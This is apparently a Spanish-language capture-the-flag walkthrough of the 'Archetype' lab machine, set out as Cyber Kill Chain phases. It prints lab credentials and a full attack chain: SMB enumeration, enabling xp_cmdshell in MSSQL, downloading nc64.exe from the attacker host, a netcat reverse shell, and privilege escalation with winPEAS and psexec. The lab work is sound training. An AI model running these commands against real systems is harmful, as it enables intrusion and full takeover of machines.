
Debido a que es una maquia inicial y se encuentre ampliamente documentada, en este artículo se resumen los pasos dentro de las fases de la "Cyber Kill Chain" y se escriben los comandos de cada uno.
Para comprender todos los pasos realizados, es fundamental tener en cuenta que la situación final deseable es acceder a la máquina objetivo con privilegios de administrador.

## 1. Reconnaissance

En esta fase, se ejecuta nmap para enumerar la máquina objetivo.
```shell
nmap -sC -sV {dest-IP}
```
Se observa esta información significativa:
```shell
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-12-30T18:06:04
|_Not valid after:  2051-12-30T18:06:04
|_ssl-date: 2021-12-30T18:13:51+00:00; +10m45s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
Posteriormente se enumeran los recursos compartidos por SMB:
```shell
smbclient -N -L \\\\{dest-IP}

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```
Se accede a backups y se observa en un documento la siguiente información, que corresponde con el nombre de usuario y la contraseña del mssql del puerto 1433:
```
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
```
## 2. Weaponization

En esta fase todo el sofware a utilizar posteriormente ya se encuentra desarrollado y es el siguiente. Aunque se va necesitando según se analiza la máquina, se expone en esta fase para simplificar la comprensión.

1. [Impacket](https://github.com/SecureAuthCorp/impacket) - script mssqlclient.py - Utilizado como cliente mssql para conectarse al servicio con las credenciales encontradas
2. [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) - Netcat for NT 64 bits - Para conectarse de manera remota al host
3. [winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/tag/refs/pull/252/merge) - Para la escalada de privilegios en Windows con las credenciales de 'administrator'
4. script psexec.py de Impacket, utilzado para obtener una shell como administrador

## 3. Delivery

Utilizando las credenciales de mssql, se conecta mediante el script mssqlclient.py de impacket al servidor MSSQL.
```
python3 mssqlclient.py ARCHETYPE/sql_svc@{dest-IP} -windows-auth
```
Como se conocen en profundidad las características de MSSQL Server que se exponen en los artículos citados a continuación, se comprueba si la opción xp_cmdshell está activada.
* [Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
* [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

```
SELECT is_srvrolemember('sysadmin'); #Para comprobar si se tienen permisos de administrador con el usuario ARCHETYPE/sql_svc 
```
Como sí se tienen, se prueba si xp_cmdshell está activada y como no lo está, se activa de la siguiente forma:

```
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```
A continuación se sube a la máquina el ejecutable nc64.exe mediante wget

```
 # En el host
sudo python3 -m http.server 80  #Se prepara un servidor http en la misma carpeta que contiene el ejecutable
```
```
 # En la máquina
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://host-IP/nc64.exe -outfile nc64.exe"
```
Ahora se pone en modo escucha Netcat en el host por el puerto 443
```
nc -lvnp 443
```
## 4.Exploitation

En esta fase, se contempla tanto la explotación de la máquina como la escalada de privilegios.
A continuación se abre una shell desde la máquina usando nc64.exe
```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe host-IP 443"
```
Una vez hecho este paso, posemos encontrar el flag de usuario en el escritorio.

Para la escalada de privilegios, hacemos uso de winPEASx64.exe, subiéndolo igual que el otro ejecutable.
```
powershell
wget http://host-IP/winPEASx64.exe -outfile winPEASx64.exe
```
Se ejecuta y de toda la información mostrada, destaca la expuesta
```
.\winPEASx64.exe

 SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED  #Permite la escalada de privilegios de diferentes formas

```

De la misma forma que .bash_history, PowerShell tiene otro historial llamado ConsoleHost_history.txt que se encuentra en
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
```
Si se accede, se ecuentra lo siguiente: /user:administraror MEGACORP_4dm1n!!
Por lo que haciendo uso de la contraseña y el script psexec.py, obtenemos una shell de administrador en la máquina
```
python3 psexec.py administrator@{TARGET_IP}
```
Y como siempre, en el escritorio, encontramos la flag :)

Debido a que no se obtiene persistencia ni se borran las pruebas, las siguientes fases no se llevan a cabo

## 5. Installation
## 6. Command and Control
## 7. Contain
